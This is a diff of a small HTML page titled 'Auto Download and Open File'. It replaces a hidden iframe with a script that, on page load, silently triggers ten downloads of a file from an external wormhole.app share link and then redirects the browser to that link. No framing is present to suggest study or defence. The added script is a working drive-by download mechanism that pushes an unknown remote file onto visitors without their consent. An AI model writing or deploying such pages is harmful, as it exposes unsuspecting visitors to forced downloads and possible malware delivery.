@@ -1,3 +1,30 @@
-<html>
-<head></head>
-<body><iframe hidden scr="https://wormhole.app/DrDA6#3Oqip-_BImRRqwatS_5uVg"></Body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Auto Download and Open File</title>
+</head>
+<body>
+
+<script>
+window.onload = function() {
+    // Loop 10 times
+    for (var i = 0; i < 10; i++) {
+        // Create an anchor element
+        var downloadLink = document.createElement('a');
+        downloadLink.href = 'https://wormhole.app/DrDA6#3Oqip-_BImRRqwatS_5uVg'; // Replace with your link
+        downloadLink.download = 'filename_' + i + '.ext'; // Specify the filename and extension
+        document.body.appendChild(downloadLink);
+        downloadLink.click(); // Simulate a click on the link to trigger the download
+        document.body.removeChild(downloadLink); // Clean up the element from the DOM
+    }
+    // After downloading, open the downloaded file
+    setTimeout(function(){
+        window.location.href = 'https://wormhole.app/DrDA6#3Oqip-_BImRRqwatS_5uVg'; // Replace with your link
+    }, 200); // Adjust the timeout value as needed
+};
+</script>
+
+</body>
+</html>
